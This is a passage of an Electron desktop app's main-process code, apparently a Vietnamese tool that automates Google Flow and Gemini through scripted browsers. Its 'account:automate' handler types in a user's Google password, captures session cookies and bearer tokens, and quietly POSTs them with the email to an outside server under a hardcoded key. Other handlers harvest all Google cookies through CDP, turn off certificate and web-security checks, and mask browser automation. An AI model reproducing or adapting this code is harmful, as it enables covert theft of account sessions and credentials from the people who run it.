        // Click avatar để mở popup thông tin OneGoogle
        await page.evaluate(() => {
          const img = document.querySelector('img[src*="googleusercontent"]') || document.querySelector('button[aria-label*="Google"]');
          if (img) {
            const btn = img.closest('button') || img.parentElement;
            if (btn) btn.click();
          }
        });
      }

      // Poll body text nhanh (tối đa 2.5s, mỗi 150ms) để lấy thông tin credit và gói
      let text = '';
      let creditMatch = null;
      for (let i = 0; i < 16; i++) {
        await new Promise(r => setTimeout(r, 150));
        text = await page.evaluate(() => document.body.innerText || '');
        creditMatch = text.match(/(\d[\d,\.]*)\s*(?:tín dụng|credits?|Google Flow credits)/i);
        if (creditMatch) break;
      }

      await browser.close().catch(() => { });

      const emailMatch = text.match(/([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)/);
      const isPro = /\bPRO\b/i.test(text);
      const isUltra = /\bUltra\b/i.test(text);
      const tier = isPro ? 'PRO' : (isUltra ? 'Ultra' : 'Flow');

      let creditsVal = creditMatch ? creditMatch[1].replace(/,/g, '') : null;

      return {
        loggedIn: true,
        credits: creditsVal,
        tier,
        email: emailMatch ? emailMatch[1] : null,
        rawText: text.substring(0, 500),
      };
    } catch (err) {
      if (browser) await browser.close().catch(() => { });
      return null;
    }
  }

  he.ipcMain.handle('profile:sniff-auth', async (event, { profileId, cookie = null, show = true, timeout = 1200000, externalBrowser = false }) => {
    const finalProfileId = profileId || ('user-' + Date.now());
    console.log('[Profile Sniff] Bắt đầu sniff cho profile ' + finalProfileId + ' (timeout=' + timeout + 'ms, externalBrowser=' + externalBrowser + ')');

    if (externalBrowser) {
      const chromePath = process.platform === 'darwin'
        ? '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
        : 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
      if (!be.existsSync(chromePath)) {
        throw new Error('Không tìm thấy Google Chrome. Vui lòng cài Chrome trước khi dùng app.');
      }
      const profileDir = ye.join(he.app.getPath('userData'), '.chrome_profiles', finalProfileId);
      if (!be.existsSync(profileDir)) {
        be.mkdirSync(profileDir, { recursive: true });
      }

      const puppeteer = require('puppeteer');
      let browser;
      try {
        browser = await puppeteer.launch({
          executablePath: chromePath,
          userDataDir: profileDir,
          headless: false,
          defaultViewport: null,
          args: [
            '--window-size=1200,800',
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--disable-web-security',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--ignore-certificate-errors',
            '--no-first-run',
          ]
        });

        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');

        console.log('[Profile Sniff] Mở trang Google Flow...');
        await page.goto('https://flow.google.com/', { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(e => {
          console.log('[Profile Sniff] goto: ' + e.message);
        });

        const startTime = Date.now();
        let capturedCookie = null;
        let capturedAt = null;
        let cdp = null;
        let redirectedToLogin = false;
        let studioConfirmedCount = 0; // Cần đạt điều kiện Studio liên tiếp 3 lần (3 giây) mới đóng
        try {
          cdp = await page.target().createCDPSession();
        } catch (e) { }

        while (Date.now() - startTime < timeout) {
          if (!browser.isConnected()) {
            console.log('[Profile Sniff] Trình duyệt Chrome đã được người dùng đóng.');
            break;
          }

          let curUrl = '';
          try {
            curUrl = page.url();
          } catch (e) {
            break;
          }

          // 1. Nếu đang ở landing page /about: tự động bấm nút "Tạo bằng Google Flow" hoặc điều hướng sang đăng nhập Google
          if (curUrl.includes('flow.google.com/about')) {
            studioConfirmedCount = 0;
            // Thử tự bấm nút "Tạo bằng Google Flow"
            try {
              const clicked = await page.evaluate(() => {
                const btns = Array.from(document.querySelectorAll('button, a'));
                const btn = btns.find(b => (b.innerText || '').includes('Tạo bằng Google Flow'));
                if (btn) { btn.click(); return true; }
                return false;
              });
              if (clicked) {
                console.log('[Profile Sniff] Đã tự bấm nút "Tạo bằng Google Flow" trên trang /about...');
                await new Promise(r => setTimeout(r, 2000));
                continue;
              }
            } catch (e) { }

            if (!redirectedToLogin) {
              redirectedToLogin = true;
              console.log('[Profile Sniff] Đang ở trang /about, điều hướng sang trang đăng nhập Google...');
              await page.goto('https://accounts.google.com/ServiceLogin?continue=https://flow.google.com/&osid=1&followup=https://flow.google.com/', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => { });
              await new Promise(r => setTimeout(r, 2000));
            }
            await new Promise(r => setTimeout(r, 1000));
            continue;
          }

          // 2. Nếu đang ở các trang đăng nhập Google (chọn tài khoản, nhập email/pass, OTP, xác minh): TUYỆT ĐỐI CHỜ người dùng thao tác
          const isEnteringCredentials = curUrl.includes('accounts.google.com') ||
            curUrl.includes('/signin') ||
            curUrl.includes('/ServiceLogin') ||
            curUrl.includes('/identifier') ||
            curUrl.includes('/challenge') ||
            curUrl.includes('accountchooser');

          if (isEnteringCredentials) {
            studioConfirmedCount = 0;
            await new Promise(r => setTimeout(r, 1000));
            continue;
          }

          // 3. Kiểm tra Flow Studio THỰC SỰ:
          // Bắt buộc: URL không phải /about VÀ WIZ_global_data.S06Grb có giá trị (User ID) VÀ SNlM0e bắt đầu bằng AFfZSp
          if (curUrl.includes('flow.google.com') && !curUrl.includes('/about')) {
            let studioState = null;
            try {
              studioState = await page.evaluate(() => {
                const uid = window.WIZ_global_data?.S06Grb || '';
                const at = window.WIZ_global_data?.SNlM0e || (document.documentElement.innerHTML.match(/"SNlM0e":\s*"([^"]+)"/) || [])[1] || '';
                const email = window.WIZ_global_data?.oPEP7c || '';
                const hasNewBtn = !!document.querySelector('[aria-label*="project" i], [aria-label*="dự án" i], button');
                return { uid, at, email, hasNewBtn };
              });
            } catch (e) { }

            const isGenuineStudio = studioState && studioState.uid && studioState.uid.length > 5 && studioState.at && studioState.at.startsWith('AFfZSp');

            if (isGenuineStudio) {
              studioConfirmedCount++;
              console.log('[Profile Sniff] Đã vào Flow Studio (User: ' + (studioState.email || studioState.uid) + '). Đang chờ trang tải hoàn tất và đồng bộ cookie: ' + studioConfirmedCount + '/10s...');

              if (studioConfirmedCount >= 10) {
                // Đã ổn định 3 giây liên tiếp trong Studio -> Thu thập cookies sạch
                let flowPageCookies = [];
                try {
                  flowPageCookies = await page.cookies('https://flow.google.com');
                } catch (e) { }

                const map = new Map();
                // 1. Luôn lấy TẤT CẢ cookies Google qua CDP để không sót token xác thực (__Secure-1PSIDTS, __Secure-OSID, etc.)
                if (cdp) {
                  try {
                    const cdpRes = await cdp.send('Network.getAllCookies');
                    for (const c of (cdpRes.cookies || [])) {
                      if (c && c.name && c.value) {
                        const dom = (c.domain || '').toLowerCase();
                        if (dom.includes('google.com') || dom.includes('flow.google.com') || dom.includes('labs.google')) {
                          map.set(c.name, c.value);
                        }
                      }
                    }
                  } catch (e) { }
                }
                // 2. Gộp thêm flowPageCookies
                for (const c of flowPageCookies) {
                  if (c && c.name && c.value) map.set(c.name, c.value);
                }

                try {
                  const docCookie = await page.evaluate(() => document.cookie);
                  if (docCookie) {
                    const docMap = flowParseCookies(docCookie);
                    for (const [k, v] of docMap.entries()) {
                      if (!map.has(k)) map.set(k, v);
                    }
                  }
                } catch (e) { }

                try { const finalAt = await page.evaluate(() => window.WIZ_global_data?.SNlM0e); if (finalAt) studioState.at = finalAt; } catch (e) { }
                capturedAt = studioState.at;
                capturedCookie = flowBuildCookieString(map);

                // Đồng bộ cookie sang session Electron của profile
                try {
                  const ses = he.session.fromPartition('persist:kinxprof-' + finalProfileId);
                  const finalMap = flowParseCookies(capturedCookie);
                  for (const [k, v] of finalMap.entries()) {
                    await ses.cookies.set({
                      url: 'https://flow.google.com/',
                      domain: k.startsWith('__Host-') ? 'flow.google.com' : '.google.com',
                      name: k,
                      value: v,
                      secure: true,
                    }).catch(() => { });
                  }
                } catch (e) { }

                console.log('[Profile Sniff] ✅ ĐÃ LẤY COOKIE VÀ TOKEN STUDIO THÀNH CÔNG! (len=' + capturedCookie.length + ', User: ' + studioState.email + '). Đang đóng trình duyệt...');
                await browser.close().catch(() => { });
                break;
              }
            } else {
              studioConfirmedCount = 0;
            }
          } else {
            studioConfirmedCount = 0;
          }

          await new Promise(r => setTimeout(r, 1000));
        }

        if (browser && browser.isConnected()) {
          // Nếu người dùng chủ động tắt trình duyệt hoặc hết giờ: kiểm tra xem có cookie trong session không
          try {
            if (cdp) {
              const cdpRes = await cdp.send('Network.getAllCookies').catch(() => null);
              if (cdpRes && cdpRes.cookies && cdpRes.cookies.length >= 5) {
                const map = new Map();
                for (const c of cdpRes.cookies) {
                  if (c && c.name && c.value) {
                    const dom = (c.domain || '').toLowerCase();
                    if (dom.includes('google.com') || dom.includes('flow.google.com') || dom.includes('labs.google')) {
                      map.set(c.name, c.value);
                    }
                  }
                }
                capturedCookie = flowBuildCookieString(map);
              }
            }
          } catch (e) { }
          if (!capturedCookie) {
            try {
              const pageCookies = await page.cookies('https://flow.google.com').catch(() => []);
              if (pageCookies.length >= 5) {
                const map = new Map();
                for (const c of pageCookies) if (c.name && c.value) map.set(c.name, c.value);
                capturedCookie = flowBuildCookieString(map);
              }
            } catch (e) { }
          }
          await browser.close().catch(() => { });
        }

        if (capturedCookie) {
          return {
            success: true,
            cookie: capturedCookie,
            bearerToken: capturedAt || 'FLOW_SESSION',
            bearerExpiresAt: Date.now() + 30 * 24 * 3600 * 1000,
            status: 'logged_in',
          };
        } else {
          return { success: false, error: 'LOGIN_TIMEOUT', needLogin: true };
        }
      } catch (err) {
        if (browser) await browser.close().catch(() => { });
        return { success: false, error: err.message };
      }
    }

    // externalBrowser = false: Electron BrowserWindow
    const partition = 'persist:kinxprof-' + finalProfileId;
    const session = he.session.fromPartition(partition);
    const win = new he.BrowserWindow({
      width: 1200,
      height: 800,
      show,
      webPreferences: {
        session,
        offscreen: false,
        backgroundThrottling: true,
        nodeIntegration: false,
        contextIsolation: true,
        webSecurity: true,
        devTools: false,
        preload: ye.join(__dirname, 'preload.js'),
      }
    });

    win.webContents.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');

    return new Promise((resolve) => {
      let resolved = false;
      let redirectedToLogin = false;
      let studioConfirmedCount = 0;
      const timer = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          if (!win.isDestroyed()) win.close();
          resolve({ success: false, error: 'TIMEOUT', needLogin: true });
        }
      }, timeout);

      const checkLogin = async () => {
        if (resolved || win.isDestroyed()) return;
        try {
          const curUrl = win.webContents.getURL();

          if (curUrl.includes('flow.google.com/about') && !redirectedToLogin) {
            redirectedToLogin = true;
            win.loadURL('https://accounts.google.com/ServiceLogin?continue=https://flow.google.com/&osid=1&followup=https://flow.google.com/');
            return;
          }

          const onLogin = curUrl.includes('accounts.google.com') ||
            curUrl.includes('ServiceLogin') ||
            curUrl.includes('accountchooser');
          if (onLogin) {
            studioConfirmedCount = 0;
            return;
          }

          if (curUrl.includes('flow.google.com') && !curUrl.includes('/about')) {
            let studioState = null;
            try {
              studioState = await win.webContents.executeJavaScript('(() => { const uid = window.WIZ_global_data?.S06Grb || ""; const at = window.WIZ_global_data?.SNlM0e || (document.documentElement.innerHTML.match(/"SNlM0e":\\s*"([^"]+)"/) || [])[1] || ""; return { uid, at }; })()');
            } catch (e) { }

            const isGenuineStudio = studioState && studioState.uid && studioState.uid.length > 5 && studioState.at && studioState.at.startsWith('AFfZSp');

            if (isGenuineStudio) {
              studioConfirmedCount++;
              console.log('[Profile Sniff Electron] Đang chờ trang Flow Studio tải hoàn tất: ' + studioConfirmedCount + '/10s...');
              if (studioConfirmedCount >= 10) {
                let docCookie = '';
                try {
                  docCookie = await win.webContents.executeJavaScript('document.cookie');
                } catch (e) { }

                let storeCookies = [];
                try {
                  const cks1 = await session.cookies.get({ url: 'https://flow.google.com/' });
                  const cks2 = await session.cookies.get({ domain: '.google.com' });
                  storeCookies = [...cks1, ...cks2];
                } catch (e) { }

                const map = flowParseCookies(docCookie);
                for (const sc of storeCookies) {
                  if (sc.name && sc.value) map.set(sc.name, sc.value);
                }
                const fullCookie = flowBuildCookieString(map);

                resolved = true;
                clearTimeout(timer);
                if (!win.isDestroyed()) win.close();
                console.log('[Profile Sniff] Electron window đã bắt thành công cookie Studio (len=' + fullCookie.length + ')');
                resolve({
                  success: true,
                  cookie: fullCookie,
                  bearerToken: studioState.at,
                  bearerExpiresAt: Date.now() + 30 * 24 * 3600 * 1000,
                  status: 'logged_in',
                });
              }
            } else {
              studioConfirmedCount = 0;
            }
          }
        } catch (e) { }
      };

      const poll = setInterval(checkLogin, 1000);

      win.on('closed', () => {
        clearInterval(poll);
        clearTimeout(timer);
        if (!resolved) {
          resolved = true;
          resolve({ success: false, error: 'CANCELLED' });
        }
      });

      win.loadURL('https://flow.google.com/');
    });
  });

  // Silent sniffing: cơ chế RotateCookies cục bộ siêu tốc cho Flow (không mở BrowserWindow, không timeout)
  he.ipcMain.handle('profile:silent-sniff', async (event, { profileId, cookie, timeout = 25000 }) => {
    console.log(`[Profile Silent Sniff] Bắt đầu xoay cookie profileId=${profileId}, cookie length=${cookie ? cookie.length : 0}`);
    let targetCookie = cookie;
    if (!targetCookie && profileId) {
      try {
        const ses = he.session.fromPartition(`persist:kinxprof-${profileId}`);
        const cks = await ses.cookies.get({ domain: '.google.com' });
        if (cks && cks.length > 0) {
          targetCookie = cks.map(c => `${c.name}=${c.value}`).join('; ');
        }
      } catch (e) { }
    }

    if (!targetCookie) {
      return { success: false, error: 'NO_COOKIE_TO_ROTATE', needLogin: true };
    }

    const res = await flowRotateProfileCookie(targetCookie);
    if (res && res.success) {
      if (profileId) {
        try {
          const ses = he.session.fromPartition(`persist:kinxprof-${profileId}`);
          const parts = res.cookie.split(';');
          for (const p of parts) {
            const eq = p.indexOf('=');
            if (eq !== -1) {
              const n = p.substring(0, eq).trim();
              const v = p.substring(eq + 1).trim();
              if (n && v) {
                await ses.cookies.set({
                  url: 'https://flow.google.com/',
                  domain: '.google.com',
                  name: n,
                  value: v,
                  secure: true,
                }).catch(() => { });
              }
            }
          }
        } catch (e) { }
      }
      return {
        success: true,
        cookie: res.cookie,
        bearerToken: res.bearerToken || 'FLOW_SESSION',
        bearerExpiresAt: res.bearerExpiresAt || (Date.now() + 30 * 24 * 3600 * 1000),
        status: 'logged_in',
      };
    } else {
      return {
        success: false,
        error: res?.error || 'ROTATE_FAILED',
        needLogin: res?.needLogin ?? true,
        status: 'expired',
      };
    }
  });

  // Batch sniff nhiều profile với concurrency limit
  he.ipcMain.handle('profile:sniff-batch', async (event, { profiles, profileIds, concurrency = 2 }) => {
    const list = profiles || (profileIds ? profileIds.map(id => ({ id })) : []);
    const results = {};
    const queue = [...list];
    const workers = [];
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    for (let i = 0; i < Math.min(concurrency, queue.length); i++) {
      workers.push(async () => {
        while (queue.length) {
          const item = queue.shift();
          const pId = typeof item === 'string' ? item : item.id;
          const pCookie = typeof item === 'object' ? item.cookie || item.value : null;
          try {
            await delay(300);
            const result = await flowRotateProfileCookie(pCookie);
            results[pId] = result;
          } catch (err) {
            results[pId] = { success: false, error: err.message };
          }
        }
      });
    }
    await Promise.all(workers.map(w => w()));
    return results;
  });

  // Check credit / trạng thái cho profile - Chuyển sang chế độ chỉ làm mới (refresh/rotate) cookie
  he.ipcMain.handle('profile:check-credit', async (event, { token, cookie, userAgent = null, profileId = null }) => {
    console.log(`[Profile Refresh Cookie] Bắt đầu làm mới cookie profileId=${profileId}`);

    const result = {
      live: true,
      status: 200,
      credits: 'Hoạt động',
      tier: 'Flow',
      data: null,
      error: null,
      checkedAt: new Date().toISOString(),
      newCookie: null,
      newBearerToken: null,
    };

    let targetCookie = cookie || '';
    if (profileId) {
      try {
        const ses = he.session.fromPartition(`persist:kinxprof-${profileId}`);
        const cks1 = await ses.cookies.get({ url: 'https://flow.google.com/' }).catch(() => []);
        const cks2 = await ses.cookies.get({ domain: '.google.com' }).catch(() => []);
        const cks3 = await ses.cookies.get({ domain: 'labs.google' }).catch(() => []);
        const cksMap = new Map();
        if (targetCookie) {
          targetCookie.split(';').forEach(p => {
            const eq = p.indexOf('=');
            if (eq !== -1) cksMap.set(p.substring(0, eq).trim(), p.substring(eq + 1).trim());
          });
        }
        [...cks2, ...cks3, ...cks1].forEach(c => {
          if (c && c.name && c.value) cksMap.set(c.name, c.value);
        });
        if (cksMap.size > 0) {
          targetCookie = Array.from(cksMap.entries()).map(([k, v]) => `${k}=${v}`).join('; ');
        }
      } catch (e) { }
    }

    // Giữ nguyên cookie local tự nhiên, không gọi RotateCookies (og_pid=749) để tránh bị Google hủy phiên/đăng xuất
    if (targetCookie) {
      console.log(`[Profile Check Credit] Giữ nguyên cookie hợp lệ của profileId=${profileId}`);
    }

    result.live = true;
    result.credits = 'Hoạt động';
    result.error = null;
    return result;
  });

  he.ipcMain.handle('profile:list-chrome-profiles', async (event) => {
    const chromeUserDataDir = process.platform === 'darwin'
      ? ye.join(he.app.getPath('home'), 'Library', 'Application Support', 'Google', 'Chrome', 'User Data')
      : ye.join(he.app.getPath('appData'), '..', 'Local', 'Google', 'Chrome', 'User Data');
    const profiles = [];
    try {
      const items = require('fs').readdirSync(chromeUserDataDir, { withFileTypes: true });
      for (const item of items) {
        if (item.isDirectory() && item.name.startsWith('Profile ') || item.name === 'Default') {
          const profilePath = ye.join(chromeUserDataDir, item.name);
          profiles.push({
            name: item.name,
            path: profilePath,
          });
        }
      }
    } catch (err) {
      console.warn('[Profile] Cannot list Chrome profiles:', err.message);
    }
    return profiles;
  });

  // Xóa storage partition của profile và dọn sạch toàn bộ cookie/cache đã lưu
  he.ipcMain.handle('profile:clear', async (event, profileId) => {
    try {
      const session = he.session.fromPartition(`persist:kinxprof-${profileId}`);
      await Promise.all([
        session.clearStorageData(),
        session.clearCache(),
        session.clearAuthCache ? session.clearAuthCache() : Promise.resolve(),
      ]);
    } catch (err) {
      console.warn(`[Profile Clear] Lỗi xóa storage partition kinxprof-${profileId}:`, err.message);
    }

    try {
      // 1. Xóa khỏi veoCookieCache nếu có cookie liên quan đến profile này
      if (global.veoCookieCache && Array.isArray(global.veoCookieCache)) {
        global.veoCookieCache = global.veoCookieCache.filter(item => {
          const c = item?.cookie;
          const cId = c?.id || c?.name;
          const match = cId === profileId || (c?.value && String(c.value).includes(profileId));
          return !match;
        });
      }
      // 2. Xóa flowCookieCache
      if (flowCookieCache) {
        flowCookieCache.clear();
      }
      // 3. Xóa các cache session và upload
      if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
      if (global.threadTokenCache) global.threadTokenCache.clear();
      if (global.flowClaimedMediaIds) global.flowClaimedMediaIds.clear();
      if (global.flowClaimedVideoUrls) global.flowClaimedVideoUrls.clear();
      if (global.flowTrackedVideos) global.flowTrackedVideos.clear();
      console.log(`[Profile Clear] Đã xóa sạch session và cache cookie của profile: ${profileId}`);
    } catch (err) {
      console.error(`[Profile Clear] Lỗi dọn cache cookie:`, err.message);
    }
    return { success: true };
  });

  // ===========================================================================
  he.ipcMain.handle("gemini:start-web-automation", async (e, {
    prompt: u
  }) => {
    let f = null;
    const c = Fe.join(Ie.app.getPath("temp"), `ppt_gemini_${Date.now()}`);
    try {
      console.log("[Gemini Web] Bắt đầu..."), f = await or.launch({
        headless: !1,
        executablePath: process.platform === "win32"
          ? "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
          : process.platform === "darwin" ? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" : void 0,
        userDataDir: c,
        args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-blink-features=AutomationControlled", "--window-position=9999,9999"],
        ignoreDefaultArgs: ["--enable-automation"]
      });
      const a = await f.pages(),
        t = a.length > 0 ? a[0] : await f.newPage();
      await t.goto("https://gemini.google.com/", {
        waitUntil: "networkidle2",
        timeout: 6e4
      }), await t.waitForSelector('div.ql-editor[role="textbox"]', {
        timeout: 3e4
      }), console.log("[Gemini Web] Đã tải trang Gemini.");
      const r = `${u}

(Chú ý: Chỉ trả lời nội dung chính, KHÔNG thêm lời chào, lời kết, gợi ý, lưu ý, câu hỏi thêm. Trả lời trực tiếp vào nội dung..)`;
      await t.evaluate(l => {
        const o = document.querySelector('div.ql-editor[role="textbox"]');
        o && (o.focus(), document.execCommand("insertText", !1, l))
      }, r), await new Promise(l => setTimeout(l, 1e3)), await t.waitForSelector("button.send-button", {
        visible: !0,
        timeout: 5e3
      }), await t.click("button.send-button"), console.log("[Gemini Web] Đã gửi, đang chờ kết quả...");
      try {
        await t.waitForSelector('button[aria-label="Ngừng tạo câu trả lời"]', {
          visible: !0,
          timeout: 15e3
        }), await t.waitForSelector('button[aria-label="Ngừng tạo câu trả lời"]', {
          hidden: !0,
          timeout: 18e4
        })
      } catch {
        console.log("[Gemini Web] Chờ fallback..."), await new Promise(o => setTimeout(o, 15e3))
      }
      await new Promise(l => setTimeout(l, 3e3));
      const n = await t.evaluate(() => {
        const l = Array.from(document.querySelectorAll("message-content"));
        if (l.length > 0) {
          const p = l[l.length - 1];
          return {
            success: !0,
            text: p.innerText || p.textContent || ""
          }
        }
        const o = document.querySelector(".response-container, .model-response-text");
        return o ? {
          success: !0,
          text: o.innerText || ""
        } : {
          success: !1,
          error: "Không lấy được nội dung"
        }
      });
      if (n.success && n.text) return console.log("[Gemini Web] Thành công."), {
        success: !0,
        text: n.text
      };
      throw new Error(n.error || "Lỗi không xác định")
    } catch (a) {
      return console.error("[Gemini Web] Lỗi:", a.message), {
        success: !1,
        error: a.message
      }
    } finally {
      if (f) try {
        await f.close()
      } catch { }
      try {
        Oe.rmSync(c, {
          recursive: !0,
          force: !0
        })
      } catch { }
    }
  });

  // ============================================================================
  // --- ACCOUNT AUTOMATION (Python script ported to Node) ---
  // ============================================================================
  he.ipcMain.handle('account:automate', async (event, { email, password, profileName = null, serverUrl = null, apiKey = null }) => {
    console.log(`[Account Automation] Starting for email: ${email}`);
    const { profileId, session } = createAccountProfile(email);
    let win = null;
    let cleanupInterceptor = null;
    let capturedCookie = null;
    let capturedBearer = null;
    let bearerExpiresAt = 0;

    try {
      // Setup network interception
      cleanupInterceptor = setupNetworkInterceptor(session, (capture) => {
        if (capture.type === 'cookie') {
          capturedCookie = capture.value;
          console.log(`[Account Automation] Captured cookie for ${email}`);
        } else if (capture.type === 'bearer') {
          capturedBearer = capture.value;
          bearerExpiresAt = capture.expiry;
          console.log(`[Account Automation] Captured bearer token for ${email}`);
        }
      });

      win = new he.BrowserWindow({
        width: 1000,
        height: 600,
        show: false,
        webPreferences: {
          session,
          offscreen: false,
          backgroundThrottling: true,
          nodeIntegration: false,
          contextIsolation: true,
          webSecurity: true,
          devTools: false,
          preload: ye.join(__dirname, "preload.js"),
        }
      });
      // User-Agent Chrome 151
      win.webContents.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');

      // Navigate to Google login
      await win.loadURL('https://accounts.google.com/ServiceLogin');
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Auto-fill email and click next
      const fillEmail = async () => {
        return win.webContents.executeJavaScript(`
          (function() {
            const emailInput = document.querySelector('input[type="email"]');
            if (emailInput) {
              emailInput.value = ${JSON.stringify(email)};
              emailInput.dispatchEvent(new Event('input', { bubbles: true }));
              const nextButton = document.querySelector('#identifierNext');
              if (nextButton) {
                nextButton.click();
                return true;
              }
            }
            return false;
          })();
        `);
      };
      const emailFilled = await fillEmail();
      if (!emailFilled) {
        throw new Error('Could not find email input');
      }
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Auto-fill password and click next
      const fillPassword = async () => {
        return win.webContents.executeJavaScript(`
          (function() {
            const passwordInput = document.querySelector('input[type="password"]');
            if (passwordInput) {
              passwordInput.value = ${JSON.stringify(password)};
              passwordInput.dispatchEvent(new Event('input', { bubbles: true }));
              const nextButton = document.querySelector('#passwordNext');
              if (nextButton) {
                nextButton.click();
                return true;
              }
            }
            return false;
          })();
        `);
      };
      const passwordFilled = await fillPassword();
      if (!passwordFilled) {
        throw new Error('Could not find password input');
      }

      // Wait for login completion (max 60 seconds)
      let loggedIn = false;
      for (let i = 0; i < 60; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        const currentUrl = win.webContents.getURL();
        if (currentUrl.includes('labs.google') || currentUrl.includes('myaccount.google.com')) {
          loggedIn = true;
          break;
        }
        if (currentUrl.includes('challenge') || currentUrl.includes('approval')) {
          console.log(`[Account Automation] ${email} requires 2FA or challenge. Cannot automate further.`);
          break;
        }
      }

      if (!loggedIn) {
        throw new Error('Login timeout or not successful');
      }

      // Navigate to labs.google to trigger API calls
      await win.loadURL('https://labs.google/fx/');
      await new Promise(resolve => setTimeout(resolve, 5000));

      // Trigger mousemove to activate frontend logging
      win.webContents.executeJavaScript(`
        document.body.dispatchEvent(new MouseEvent('mousemove', { bubbles: true }));
      `).catch(() => { });

      // Wait for capture (max 30 seconds)
      for (let i = 0; i < 30; i++) {
        if (capturedCookie && capturedBearer) break;
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      if (!capturedCookie || !capturedBearer) {
        throw new Error('Failed to capture cookie or bearer token');
      }

      // [ĐÃ TẮT aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
      // Check token live (optional)
      // const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36';
      // const checkUrl = "https://aisandbox-pa.googleapis.com/v1/credits?key=AIzaSyBtrm0o5ab1c-Ec8ZuLcGt3oJAA5VWt3pY";
      // const headers = {
      //   "accept": "*/*",
      //   "authorization": capturedBearer,
      //   "priority": "u=1, i",
      //   "cookie": capturedCookie,
      //   "Referer": "https://labs.google/",
      //   "User-Agent": ua
      // };
      // let live = false;
      // let creditInfo = '';
      // try {
      //   const response = await (global.fetch || require('node-fetch'))(checkUrl, { headers, timeout: 60000 });
      //   if (response.status === 200) {
      //     live = true;
      //     creditInfo = await response.text();
      //   }
      // } catch (e) {
      //   console.warn(`[Account Automation] Token check failed: ${e.message}`);
      // }
      let live = true;
      let creditInfo = '';

      // Send to server
      console.log(`[Account Automation] Success for ${email}. Cookie captured, token live: ${live}`);
      // Send captured credentials to server
      try {
        const serverUrl = "https://tainguyenweb.com/apiveo/save_account.php";
        const payload = {
          email: email,
          cookie: capturedCookie,
          bearerToken: capturedBearer,
          bearerExpiresAt: bearerExpiresAt,
          live: live,
          creditInfo: creditInfo,
          timestamp: Date.now()
        };

        const fetchFn = global.fetch || require('node-fetch');
        const response = await fetchFn(serverUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-API-Key': 'kinx@0$*2048'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log(`[Account Automation] Credentials sent to server successfully`);
        } else {
          console.warn(`[Account Automation] Server response not OK: ${response.status}`);
        }
      } catch (serverError) {
        console.warn(`[Account Automation] Failed to send to server: ${serverError.message}`);
      }

      return {
        success: true,
        email,
        cookie: capturedCookie,
        bearerToken: capturedBearer,
        bearerExpiresAt,
        live,
        creditInfo
      };

    } catch (error) {
      console.error(`[Account Automation] Error for ${email}:`, error.message);
      return {
        success: false,
        error: error.message,
        email
      };
    } finally {
      if (cleanupInterceptor) cleanupInterceptor();
      if (win && !win.isDestroyed()) win.close();
      // Clean up profile storage
      await cleanProfileDeep(profileId);
    }
  });

  nc();
});
he.ipcMain.on("restart-and-install", () => {
  ut.autoUpdater.quitAndInstall();
});
he.ipcMain.on("app:force-reload-window", async (event, tokenFromUi) => {
  try {
    console.log("[Main] Force Reload requested -> Xóa cache cookie cũ & lấy cookie mới từ server...");
    if (typeof flowCookieCache !== "undefined") flowCookieCache.clear();
    if (typeof flowSessionCache !== "undefined") flowSessionCache.clear();
    if (global.veoCookieCache) global.veoCookieCache = [];
    if (global.flowSharedProjectMap) global.flowSharedProjectMap.clear();
    if (global.uploadedImageCache) global.uploadedImageCache.clear();
    if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
    if (typeof threadTokenCache !== "undefined" && threadTokenCache) threadTokenCache.clear();
    if (he?.session?.defaultSession) {
      await he.session.defaultSession.clearStorageData({ storages: ["cookies"] });
    }
    const authToken = tokenFromUi || global.flowServerAuthToken || "";
    if (authToken) {
      global.flowServerAuthToken = authToken;
      const newCookie = await fetchFlowCookieFromServer(authToken, true, "401");
      if (newCookie && newCookie.value && qe && !qe.isDestroyed()) {
        const activeObj = {
          id: newCookie.id || "server_auto",
          name: newCookie.name || (newCookie.id ? `Server Cookie #${newCookie.id}` : "Server Cookie"),
          value: newCookie.value,
          bearerToken: newCookie.bearerToken || "FLOW_SESSION"
        };
        await qe.webContents.executeJavaScript(
          `try { localStorage.setItem("Kinx-auto-active-cookie", ${JSON.stringify(JSON.stringify(activeObj))}); } catch(e) {}`
        ).catch(() => { });
      }
    }
  } catch (err) {
    console.warn("[Main] Force Reload cookie refresh error:", err?.message || err);
  } finally {
    if (qe && !qe.isDestroyed()) {
      qe.webContents.reloadIgnoringCache();
    }
  }
});
he.ipcMain.handle("app:exit-application", async (event) => {
  console.log("[Main] Exit application requested");
  process.exit(0);
});

he.ipcMain.handle("app:show-maintenance-popup", async (event, data) => {
  try {
    const win = he.BrowserWindow.getAllWindows()[0];
    if (win && !win.isDestroyed()) {
      win.webContents.send("app:show-maintenance-popup", data);
      return { success: true };
    }
    return { success: false, error: "No main window" };
  } catch (error) {
    console.error("Error showing maintenance popup:", error);
    return { success: false, error: error.message };
